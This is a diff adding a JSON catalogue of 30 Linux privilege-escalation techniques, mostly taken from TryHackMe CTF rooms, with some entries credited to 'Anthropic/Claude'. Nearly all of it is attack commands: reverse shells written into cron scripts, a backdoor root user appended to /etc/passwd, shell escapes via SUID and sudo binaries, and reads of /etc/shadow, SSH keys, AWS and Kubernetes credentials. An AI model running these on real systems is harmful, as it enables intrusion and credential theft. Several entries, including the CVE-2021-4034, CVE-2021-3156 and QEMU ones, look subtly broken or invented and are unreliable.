@@ -1,0 +1,385 @@
+{
+  "version": "1.0",
+  "generated": "2026-02-26",
+  "total_entries": 30,
+  "by_category": {
+    "SUDO_NOPASSWD_CUSTOM": 2,
+    "SUID_CUSTOM": 3,
+    "SUID_GTFOBINS": 5,
+    "SUDO_NOPASSWD_DIRECT": 3,
+    "WRITABLE_CRON": 3,
+    "OTHER": 11,
+    "SUDO_RULE_CVE": 2,
+    "CAPABILITY_SETUID": 1
+  },
+  "entries": [
+    {
+      "id": "sudo_anansi_util_root",
+      "category": "SUDO_NOPASSWD_CUSTOM",
+      "binary": "anansi_util",
+      "cve": null,
+      "exploitation": [
+        "sudo /path/to/custom_binary manual man",
+        "!/bin/sh"
+      ],
+      "source": "tryhackme/BrainPan"
+    },
+    {
+      "id": "suid_validate_root",
+      "category": "SUID_CUSTOM",
+      "binary": "validate",
+      "cve": null,
+      "exploitation": [
+        "/usr/local/bin/validate"
+      ],
+      "source": "tryhackme/BrainPan"
+    },
+    {
+      "id": "suid_nmap_interactive_root",
+      "category": "SUID_GTFOBINS",
+      "binary": "nmap",
+      "cve": null,
+      "exploitation": [
+        "nmap --interactive",
+        "nmap> !/bin/sh"
+      ],
+      "source": "tryhackme/MrRobot"
+    },
+    {
+      "id": "sudo_all_alison_root",
+      "category": "SUDO_NOPASSWD_DIRECT",
+      "binary": null,
+      "cve": null,
+      "exploitation": [
+        "sudo -l",
+        "sudo su -"
+      ],
+      "source": "tryhackme/Poster"
+    },
+    {
+      "id": "suid_python_setuid_root",
+      "category": "SUID_GTFOBINS",
+      "binary": "python",
+      "cve": null,
+      "exploitation": [
+        "python -c 'import os; os.setuid(0); os.system(\"/bin/sh\")'"
+      ],
+      "source": "tryhackme/RootMe"
+    },
+    {
+      "id": "sudo_all_wwwdata_bash_root",
+      "category": "SUDO_NOPASSWD_DIRECT",
+      "binary": "bash",
+      "cve": null,
+      "exploitation": [
+        "sudo -l",
+        "sudo bash"
+      ],
+      "source": "tryhackme/Pickle Rick"
+    },
+    {
+      "id": "suid_checker_root",
+      "category": "SUID_CUSTOM",
+      "binary": "checker",
+      "cve": null,
+      "exploitation": [
+        "cd /usr/sbin",
+        "./checker"
+      ],
+      "source": "tryhackme/Blog"
+    },
+    {
+      "id": "writable_cron_cube_root",
+      "category": "WRITABLE_CRON",
+      "binary": "cube.sh",
+      "cve": null,
+      "exploitation": [
+        "echo '#!/bin/bash' > /path/to/script.sh",
+        "echo 'bash -i >& /dev/tcp/<ip>/<port> 0>&1' >> /path/to/script.sh",
+        "chmod +x /path/to/script.sh"
+      ],
+      "source": "tryhackme/Fowsniff CTF"
+    },
+    {
+      "id": "suid_sudo_gtfo_root",
+      "category": "SUID_GTFOBINS",
+      "binary": "sudo",
+      "cve": null,
+      "exploitation": [
+        "find / -perm -4000 -type f 2>/dev/null",
+        "sudo -i"
+      ],
+      "source": "tryhackme/CC: Pen Testing"
+    },
+    {
+      "id": "suid_find_exec_root",
+      "category": "SUID_GTFOBINS",
+      "binary": "find",
+      "cve": null,
+      "exploitation": [
+        "find . -exec /bin/sh -p \\; -quit"
+      ],
+      "source": "tryhackme/Anonymous"
+    },
+    {
+      "id": "sudo_tar_checkpoint_root",
+      "category": "SUDO_NOPASSWD_CUSTOM",
+      "binary": "tar",
+      "cve": null,
+      "exploitation": [
+        "sudo tar -cf /dev/null /dev/null --checkpoint=1 --checkpoint-action=exec=/bin/bash"
+      ],
+      "source": "tryhackme/Bounty Hacker"
+    },
+    {
+      "id": "writable_cron_vulnnet_root",
+      "category": "WRITABLE_CRON",
+      "binary": "tar",
+      "cve": null,
+      "exploitation": [
+        "echo 'echo \"/bin/bash\" > exploit.sh' > '--checkpoint=1'",
+        "echo 'chmod +s /bin/bash' > exploit.sh",
+        "/bin/bash -p"
+      ],
+      "source": "tryhackme/VulnNet"
+    },
+    {
+      "id": "docker_daemon_escalation_root",
+      "category": "OTHER",
+      "binary": "docker",
+      "cve": null,
+      "exploitation": [
+        "docker -H <host>:2375 run --rm -it --privileged --net=host -v /:/mnt <image>",
+        "ls /mnt"
+      ],
+      "source": "tryhackme/Couch",
+      "tags": [
+        "docker",
+        "container"
+      ]
+    },
+    {
+      "id": "qemu_kvm_escape_root",
+      "category": "OTHER",
+      "binary": "qemu-ga",
+      "cve": null,
+      "exploitation": [
+        "qemu-ga --method=guest-exec --params='{\"cmd\":\"/bin/bash\"}'",
+        "cat /etc/shadow"
+      ],
+      "source": "Generic QEMU escape",
+      "tags": [
+        "qemu",
+        "kvm",
+        "container"
+      ]
+    },
+    {
+      "id": "suid_system_control_root",
+      "category": "SUID_CUSTOM",
+      "binary": "system-control",
+      "cve": null,
+      "exploitation": [
+        "/path/to/system-control",
+        "Enter command: /bin/bash -p"
+      ],
+      "source": "tryhackme/Advent of Cyber 1"
+    },
+    {
+      "id": "sudo_cat_shadow_root",
+      "category": "SUDO_NOPASSWD_DIRECT",
+      "binary": "cat",
+      "cve": null,
+      "exploitation": [
+        "sudo cat /etc/shadow"
+      ],
+      "source": "tryhackme/Brute It"
+    },
+    {
+      "id": "pkexec_polygot_kekeo_root",
+      "category": "SUDO_RULE_CVE",
+      "binary": "pkexec",
+      "cve": "CVE-2021-4034",
+      "exploitation": [
+        "pkexec --version",
+        "# If vulnerable, execute: pkexec $(printf '%s' 'AAAA' | xxd -r -p)"
+      ],
+      "source": "Anthropic/Claude"
+    },
+    {
+      "id": "gitlab_runner_token_root",
+      "category": "OTHER",
+      "binary": "gitlab-runner",
+      "cve": null,
+      "exploitation": [
+        "cat /etc/gitlab-runner/config.toml",
+        "grep token /etc/gitlab-runner/config.toml"
+      ],
+      "source": "Anthropic/Claude",
+      "tags": [
+        "gitlab",
+        "ci-cd"
+      ]
+    },
+    {
+      "id": "kubectl_token_root",
+      "category": "OTHER",
+      "binary": "kubectl",
+      "cve": null,
+      "exploitation": [
+        "cat /run/secrets/kubernetes.io/serviceaccount/token",
+        "kubectl --token <token> get pods -A"
+      ],
+      "source": "Anthropic/Claude",
+      "tags": [
+        "kubernetes",
+        "container"
+      ]
+    },
+    {
+      "id": "suid_runme_credentials_catlover",
+      "category": "SUID_GTFOBINS",
+      "binary": "runme",
+      "cve": null,
+      "exploitation": [
+        "./runme",
+        "Enter password: <password>",
+        "cat <path_to_id_rsa>"
+      ],
+      "source": "tryhackme/Cat Pictures"
+    },
+    {
+      "id": "sudo_baron_samedit_root",
+      "category": "SUDO_RULE_CVE",
+      "binary": "sudo",
+      "cve": "CVE-2021-3156",
+      "exploitation": [
+        "sudoedit $(printf '%*s' 65536 '')",
+        "sudoedit -s -p '/bin/sh -i'"
+      ],
+      "source": "Anthropic/Claude"
+    },
+    {
+      "id": "cap_setuid_escalation_root",
+      "category": "CAPABILITY_SETUID",
+      "binary": "cap_setuid",
+      "cve": null,
+      "exploitation": [
+        "python3 -c 'import os; os.setuid(0); os.system(\"/bin/sh\")'"
+      ],
+      "source": "Anthropic/Claude"
+    },
+    {
+      "id": "writable_etc_passwd_root",
+      "category": "OTHER",
+      "binary": "/etc/passwd",
+      "cve": null,
+      "exploitation": [
+        "echo 'backdoor:x:0:0:root:/root:/bin/bash' >> /etc/passwd",
+        "su - backdoor"
+      ],
+      "source": "Anthropic/Claude",
+      "tags": [
+        "passwd"
+      ]
+    },
+    {
+      "id": "writable_cron_clean_root",
+      "category": "WRITABLE_CRON",
+      "binary": "clean.sh",
+      "cve": null,
+      "exploitation": [
+        "cd /path/to/script/directory",
+        "echo '#!/bin/bash' > clean.sh",
+        "echo 'bash -i >& /dev/tcp/<ip>/<port> 0>&1' >> clean.sh",
+        "chmod +x clean.sh"
+      ],
+      "source": "tryhackme/Cat Pictures"
+    },
+    {
+      "id": "ssh_key_leak_root",
+      "category": "OTHER",
+      "binary": "/root/.ssh/id_rsa",
+      "cve": null,
+      "exploitation": [
+        "cat /root/.ssh/id_rsa",
+        "ssh -i /root/.ssh/id_rsa root@<target>"
+      ],
+      "source": "Anthropic/Claude",
+      "tags": [
+        "ssh"
+      ]
+    },
+    {
+      "id": "env_secrets_root",
+      "category": "OTHER",
+      "binary": "environment",
+      "cve": null,
+      "exploitation": [
+        "env | grep -iE 'PASS|SECRET|TOKEN|KEY|PASSWORD'",
+        "cat /etc/environment"
+      ],
+      "source": "Anthropic/Claude",
+      "tags": [
+        "env"
+      ]
+    },
+    {
+      "id": "mysql_config_root",
+      "category": "OTHER",
+      "binary": "mysql",
+      "cve": null,
+      "exploitation": [
+        "grep -r 'password' /etc/mysql/ 2>/dev/null",
+        "cat /etc/mysql/mysql.conf.d/mysqld.cnf"
+      ],
+      "source": "Anthropic/Claude",
+      "tags": [
+        "mysql"
+      ]
+    },
+    {
+      "id": "aws_credentials_root",
+      "category": "OTHER",
+      "binary": "aws",
+      "cve": null,
+      "exploitation": [
+        "cat ~/.aws/credentials",
+        "aws sts get-caller-identity"
+      ],
+      "source": "Anthropic/Claude",
+      "tags": [
+        "aws"
+      ]
+    },
+    {
+      "id": "docker_compose_secrets_root",
+      "category": "OTHER",
+      "binary": "docker-compose",
+      "cve": null,
+      "exploitation": [
+        "cat docker-compose.yml",
+        "docker compose exec <service> sh"
+      ],
+      "source": "Anthropic/Claude",
+      "tags": [
+        "compose",
+        "docker"
+      ]
+    },
+    {
+      "id": "httpd_conf_secrets_root",
+      "category": "OTHER",
+      "binary": "apache2",
+      "cve": null,
+      "exploitation": [
+        "grep -r -i 'password\\|secret\\|token' /etc/apache2/ 2>/dev/null",
+        "cat /etc/apache2/sites-available/*"
+      ],
+      "source": "Anthropic/Claude",
+      "tags": [
+        "httpd"
+      ]
+    }
+  ]
+}
